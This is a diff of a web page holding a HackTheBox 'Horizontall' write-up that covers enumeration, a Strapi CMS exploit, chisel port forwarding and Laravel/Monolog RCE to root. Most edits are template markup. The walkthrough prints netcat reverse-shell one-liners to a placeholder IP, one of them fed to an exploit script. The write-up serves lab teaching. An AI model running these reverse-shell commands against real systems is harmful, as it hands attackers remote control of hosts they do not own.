@@ -21,12 +21,11 @@
   <meta name="twitter:title" content="Horizontall Hackthebox writeup">
   <meta name="twitter:description" content="we got low-privilege access due to Vulnerable version of strapi CMS then got root access because of the Vulnerable Version of Laravel. main techniques used are : Vhost enumeration and port forwarding without ssh">
       <meta name="twitter:site" content="@tinkerhell1337">
-<meta name="application-name" content="0xMesbaha">
-<meta name="apple-mobile-web-app-title" content="0xMesbaha">
-<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-forge/" /><link rel="next" href="https://hussienmisbah.github.io/posts/linux-machines/2022-02-18-bolt/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-forge/" /><link rel="next" href="https://hussienmisbah.github.io/posts/linux-machines/2022-02-18-bolt/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
@@ -45,18 +44,7 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
-          const query = window.matchMedia('(prefers-color-scheme: dark)');
-          function applyTheme() {
-            let theme = window.localStorage?.getItem('theme') || 'dark';
-            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
-            document.body.setAttribute('theme', isDark? 'dark' : 'light');
-            document.body.setAttribute('cfg-theme', theme);
-          }
-
-          applyTheme();
-          query.addEventListener('change', applyTheme);
-        </script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
@@ -120,7 +108,7 @@
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Horizontall Hackthebox writeup</h1><div class="post-meta">
-            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/linux-machines/">Linux Machines</a></span></div>
+            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-02-04">2022-02-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;626 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
@@ -150,28 +138,13 @@
             </div><div class="content" id="content"><p>we got low-privilege access due to Vulnerable version of strapi CMS then got root access because of the Vulnerable Version of Laravel. main techniques used are : Vhost enumeration and port forwarding without ssh</p>
 <h1 id="scanning-">Scanning :</h1>
 <p>to make our life easier will export ip to use the variable $IP instead of re-typing ip</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>$export IP=10.10.11.105</code></pre></div>
-<p>starting with a basic scanning :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$nmap</span> -sV -v <span class="nv">$IP</span> -oN nmap/intial</span></span></code></pre></div></div>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+<pre tabindex="0"><code>$export IP=10.10.11.105
+</code></pre><p>starting with a basic scanning :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$nmap</span> -sV -v <span class="nv">$IP</span> -oN nmap/intial
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
 </span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span></span></span></code></pre></div></div>
-<p>when try to visit http it can&rsquo;t be opened which is an indicator we will need to make Vhost enumeration Latter</p>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span></code></pre></div><p>when try to visit http it can&rsquo;t be opened which is an indicator we will need to make Vhost enumeration Latter</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -190,47 +163,22 @@
         alt="/assets/images/Horizontall/20210906143207.png"
         title="error" /></p>
 <h3 id="directory-busting-">directory Busting :</h3>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster dir -u <span class="s2">&#34;http://horizontall.htb/&#34;</span> -w /usr/share/wordlists/dirb/common.txt</span></span></code></pre></div></div>
-<p>results :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 194<span class="o">]</span> <span class="o">[</span>--&gt; http://horizontall.htb/css/<span class="o">]</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster dir -u <span class="s2">&#34;http://horizontall.htb/&#34;</span> -w /usr/share/wordlists/dirb/common.txt
+</span></span></code></pre></div><p>results :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 194<span class="o">]</span> <span class="o">[</span>--&gt; http://horizontall.htb/css/<span class="o">]</span>
 </span></span><span class="line"><span class="cl">/favicon.ico          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4286<span class="o">]</span>
 </span></span><span class="line"><span class="cl">/img                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 194<span class="o">]</span> <span class="o">[</span>--&gt; http://horizontall.htb/img/<span class="o">]</span>
 </span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 901<span class="o">]</span>
-</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 194<span class="o">]</span> <span class="o">[</span>--&gt; http://horizontall.htb/js/<span class="o">]</span></span></span></code></pre></div></div>
-<h3 id="vhosts-enumeration-">Vhosts enumeration :</h3>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster vhost -u horizontall.htb  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span></span></code></pre></div></div>
-<p>you can also use ffuf like this :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="s2">&#34;Host: FUZZ.Horizontall.htb&#34;</span> -u http://horizontall.htb/ -c -fc <span class="m">301</span></span></span></code></pre></div></div>
-<p>-fc : filter by code u don&rsquo;t want</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">results:
+</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 194<span class="o">]</span> <span class="o">[</span>--&gt; http://horizontall.htb/js/<span class="o">]</span>
+</span></span></code></pre></div><h3 id="vhosts-enumeration-">Vhosts enumeration :</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster vhost -u horizontall.htb  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span></code></pre></div><p>you can also use ffuf like this :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="s2">&#34;Host: FUZZ.Horizontall.htb&#34;</span> -u http://horizontall.htb/ -c -fc <span class="m">301</span>
+</span></span></code></pre></div><p>-fc : filter by code u don&rsquo;t want</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">results:
 </span></span><span class="line"><span class="cl">www                     <span class="o">[</span>Status: 200, Size: 901, Words: 43, Lines: 2<span class="o">]</span>
-</span></span><span class="line"><span class="cl">api-prod                <span class="o">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span class="o">]</span></span></span></code></pre></div></div>
-<p>add api-prod to the /etc/hosts</p>
+</span></span><span class="line"><span class="cl">api-prod                <span class="o">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span class="o">]</span>
+</span></span></code></pre></div><p>add api-prod to the /etc/hosts</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -249,27 +197,17 @@
         alt="/assets/images/Horizontall/20210906150257.png"
         title="error" /></p>
 <h3 id="directory-busting--1">Directory Busting :</h3>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://api-prod.horizontall.htb/FUZZ</span></span></code></pre></div></div>
-<p>results :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Admin                   <span class="o">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span class="o">]</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://api-prod.horizontall.htb/FUZZ
+</span></span></code></pre></div><p>results :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Admin                   <span class="o">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span class="o">]</span>
 </span></span><span class="line"><span class="cl">ADMIN                   <span class="o">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span class="o">]</span>
 </span></span><span class="line"><span class="cl">admin                   <span class="o">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span class="o">]</span>
 </span></span><span class="line"><span class="cl">favicon.ico             <span class="o">[</span>Status: 200, Size: 1150, Words: 4, Lines: 1<span class="o">]</span>
 </span></span><span class="line"><span class="cl">index.html              <span class="o">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span class="o">]</span>
 </span></span><span class="line"><span class="cl">reviews                 <span class="o">[</span>Status: 200, Size: 507, Words: 21, Lines: 1<span class="o">]</span>
 </span></span><span class="line"><span class="cl">robots.txt              <span class="o">[</span>Status: 200, Size: 121, Words: 19, Lines: 4<span class="o">]</span>
-</span></span><span class="line"><span class="cl">users                   <span class="o">[</span>Status: 403, Size: 60, Words: 1, Lines: 1<span class="o">]</span></span></span></code></pre></div></div>
-<p><img
+</span></span><span class="line"><span class="cl">users                   <span class="o">[</span>Status: 403, Size: 60, Words: 1, Lines: 1<span class="o">]</span>
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Horizontall/20210906150553.png"
@@ -288,20 +226,10 @@
         alt="/assets/images/Horizontall/20210906152020.png"
         title="error" /></p>
 <p>so let&rsquo;s get our reverse shell :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc &lt;my_ip&gt; <span class="m">9999</span> &gt;/tmp/f</span></span></code></pre></div></div>
-<h3 id="stablize-the-shell-">stablize the shell :</h3>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-python">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span></span></span></code></pre></div></div>
-<h3 id="we-are-in">we are in</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc &lt;my_ip&gt; <span class="m">9999</span> &gt;/tmp/f
+</span></span></code></pre></div><h3 id="stablize-the-shell-">stablize the shell :</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span></code></pre></div><h3 id="we-are-in">we are in</h3>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -312,21 +240,11 @@
         title="/assets/images/Horizontall/20210906143208.png" /></p>
 <h2 id="privilege-escalation-">Privilege escalation :</h2>
 <p>after some manual enumeration i tried to see what are the ports running on this machine with</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -lpnut</span></span></code></pre></div></div>
-<p>and found this :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port
-tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*</code></pre></div>
-<p>you can also run <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener noreffer ">LinEnum</a> and reach the same conclusion</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -lpnut
+</span></span></code></pre></div><p>and found this :</p>
+<pre tabindex="0"><code>Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port
+tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*
+</code></pre><p>you can also run <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener noreffer ">LinEnum</a> and reach the same conclusion</p>
 <p>this port wasn&rsquo;t in the nmap scan so it isn&rsquo;t publiclly exposed.</p>
 <p>to verify this is a path we can take to look for an escalation Factor i tried to see what is the service running at this port :</p>
 <p><img
@@ -338,13 +256,8 @@ tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*</code
         alt="/assets/images/Horizontall/20210906143218.png"
         title="/assets/images/Horizontall/20210906143218.png" /></p>
 <p>and at the bottom of the output i found :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Laravel v8 <span class="o">(</span>PHP v7.4.18<span class="o">)</span></span></span></code></pre></div></div>
-<p>searching if it has an exploit and found many so we can now do <strong>port forwarding</strong> to see the web page at our browser and deal with it</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Laravel v8 <span class="o">(</span>PHP v7.4.18<span class="o">)</span>
+</span></span></code></pre></div><p>searching if it has an exploit and found many so we can now do <strong>port forwarding</strong> to see the web page at our browser and deal with it</p>
 <h2 id="port-forwading">port forwading</h2>
 <p>we have many ways to achieve that i tried ssh remote port forwarding But it doesn&rsquo;t work , so i used <a href="https://github.com/jpillora/chisel/releases" target="_blank" rel="noopener noreffer ">chisel</a></p>
 <ul>
@@ -376,13 +289,8 @@ tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*</code
         alt="/assets/images/Horizontall/20210906154800.png"
         title="error" /></p>
 <p>so let&rsquo;s get a reverse shell Finally as root</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 exploit.py <span class="s2">&#34;http://127.0.0.1:8000&#34;</span> Monolog/RCE1 <span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;my_ip&gt; 8888 &gt;/tmp/f&#34;</span></span></span></code></pre></div></div>
-<p><img
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 exploit.py <span class="s2">&#34;http://127.0.0.1:8000&#34;</span> Monolog/RCE1 <span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;my_ip&gt; 8888 &gt;/tmp/f&#34;</span>
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Horizontall/20210906154921.png"
@@ -399,7 +307,7 @@ tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*</code
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/" data-title="Horizontall Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,Port forwarding,chisel"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=https%3a%2f%2fhussienmisbah.github.io%2fposts%2flinux-machines%2f2022-02-04-horizontall%2f&amp;text=Horizontall%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/" data-title="Horizontall Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,Port forwarding,chisel"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/" data-title="Horizontall Hackthebox writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/" data-title="Horizontall Hackthebox writeup"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-02-04-horizontall/" data-title="Horizontall Hackthebox writeup"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
@@ -416,17 +324,14 @@ tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*</code
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://hussienmisbah.github.io/" target="_blank">0xMesbaha</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                 <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a>
-        </div>
-
-        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
